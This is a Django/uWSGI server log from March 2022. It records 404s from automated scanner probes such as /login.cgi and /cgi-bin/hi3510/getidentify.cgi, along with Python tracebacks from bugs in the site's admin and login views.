+2022-03-18 14:55:50,896 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 16:34:53,297 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-18 17:11:30,480 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 17:31:58,554 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-18 18:27:46,643 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /explicit_not_exist_path
+2022-03-18 18:27:46,819 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 83, in admin
+    if (status is None) | (request.session['userkind']!='adminer'):
+  File "/usr/local/lib64/python3.6/site-packages/django/contrib/sessions/backends/base.py", line 65, in __getitem__
+    return self._session[key]
+KeyError: 'userkind'
+2022-03-18 18:27:47,448 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /robots.txt
+2022-03-18 18:27:47,518 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-18 18:27:47,669 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login/img/product_logo.png
+2022-03-18 18:27:47,780 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /images/ofbiz.ico
+2022-03-18 18:27:47,866 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/css/base.css
+2022-03-18 18:27:47,935 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/js/admin/RelatedObjectLookups.js
+2022-03-18 18:27:47,998 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/css/dashboard.css
+2022-03-18 18:27:48,062 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/img/icon-no.gif
+2022-03-18 18:27:48,130 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/js/LICENSE-JQUERY.txt
+2022-03-18 18:27:48,197 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/fonts/Roboto-Light-webfont.woff
+2022-03-18 18:27:48,269 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/css/fonts.css
+2022-03-18 18:27:48,339 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/img/icon-no.svg
+2022-03-18 18:27:48,425 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /phpMyAdmin/
+2022-03-18 18:27:48,503 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /phpmyadmin/
+2022-03-18 18:27:48,588 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /wcm/
+2022-03-18 18:28:45,575 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-18 19:32:24,503 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 21:24:18,907 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 22:16:14,392 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 23:51:52,874 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 01:40:45,541 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 02:18:59,961 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 05:14:49,388 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 06:55:57,216 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 07:28:25,945 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 08:41:25,552 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 09:52:38,127 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 10:20:41,240 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-19 10:20:41,567 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /robots.txt
+2022-03-19 10:20:41,902 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /sitemap.xml
+2022-03-19 10:25:20,116 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-19 10:25:28,723 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /nice ports,/Trinity.txt.bak
+2022-03-19 10:25:35,301 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-19 10:40:23,965 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 10:53:19,481 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-19 12:11:46,526 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-19 13:12:07,111 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-19 13:14:53,085 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 13:37:23,657 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 14:05:49,240 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 14:38:51,832 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-19 17:15:11,339 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 18:11:11,535 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 18:19:57,647 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /*
+2022-03-19 18:24:33,635 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /explicit_not_exist_path
+2022-03-19 18:24:33,805 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 83, in admin
+    if (status is None) | (request.session['userkind']!='adminer'):
+  File "/usr/local/lib64/python3.6/site-packages/django/contrib/sessions/backends/base.py", line 65, in __getitem__
+    return self._session[key]
+KeyError: 'userkind'
+2022-03-19 18:24:34,353 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /robots.txt
+2022-03-19 18:24:34,426 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-19 18:24:34,564 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login/img/product_logo.png
+2022-03-19 18:24:34,663 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /images/ofbiz.ico
+2022-03-19 18:24:34,753 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/css/base.css
+2022-03-19 18:24:34,824 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/js/admin/RelatedObjectLookups.js
+2022-03-19 18:24:34,896 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/css/dashboard.css
+2022-03-19 18:24:34,972 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/img/icon-no.gif
+2022-03-19 18:24:35,053 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/js/LICENSE-JQUERY.txt
+2022-03-19 18:24:35,131 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/fonts/Roboto-Light-webfont.woff
+2022-03-19 18:24:35,207 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/css/fonts.css
+2022-03-19 18:24:35,284 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /static/admin/img/icon-no.svg
+2022-03-19 18:24:35,382 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /phpMyAdmin/
+2022-03-19 18:24:35,465 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /phpmyadmin/
+2022-03-19 18:24:35,551 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /wcm/
+2022-03-19 18:28:08,577 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 18:38:19,403 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 19:01:19,959 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 19:50:55,414 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 20:21:07,225 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 21:49:00,764 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 22:28:53,826 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-19 22:32:55,018 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-20 00:42:07,588 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-20 00:42:07,653 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /robots.txt
+2022-03-20 01:08:32,595 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-20 03:27:15,431 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-20 04:06:36,287 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-20 04:56:09,618 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /*
+2022-03-20 05:01:39,300 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-20 05:11:55,105 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-20 06:34:33,070 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-20 07:28:59,353 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:28:59,454 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:28:59,545 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:28:59,636 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:28:59,723 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:28:59,813 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:28:59,905 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:28:59,994 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:00,092 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:00,183 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:00,273 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:00,360 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:00,450 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:00,538 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:00,629 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:00,728 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:00,816 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:00,906 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:01,000 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:01,089 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:01,179 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:01,279 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:01,367 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 07:29:01,455 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /cgi-bin/hi3510/getidentify.cgi
+2022-03-20 08:16:18,237 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-20 09:34:58,007 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-20 09:35:06,077 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 94, in admin
+    return HttpResponseRedirect('../')
+UnboundLocalError: local variable 'data' referenced before assignment
+2022-03-20 09:35:18,243 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 94, in admin
+    return HttpResponseRedirect('../')
+UnboundLocalError: local variable 'data' referenced before assignment
+2022-03-20 09:36:27,140 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 94, in admin
+    return HttpResponseRedirect('./')
+UnboundLocalError: local variable 'data' referenced before assignment
+2022-03-20 09:37:28,175 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 94, in admin
+    return HttpResponseRedirect('../admin')
+UnboundLocalError: local variable 'data' referenced before assignment
+2022-03-20 09:38:05,174 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 94, in admin
+    return HttpResponseRedirect('admin/')
+UnboundLocalError: local variable 'data' referenced before assignment
+2022-03-20 09:39:37,545 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 83, in admin
+    def admin(request):
+  File "/usr/local/lib64/python3.6/site-packages/django/contrib/sessions/backends/base.py", line 65, in __getitem__
+    return self._session[key]
+KeyError: 'userkind'
+2022-03-20 09:41:27,474 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 94, in admin
+    return HttpResponseRedirect('../')
+UnboundLocalError: local variable 'data' referenced before assignment
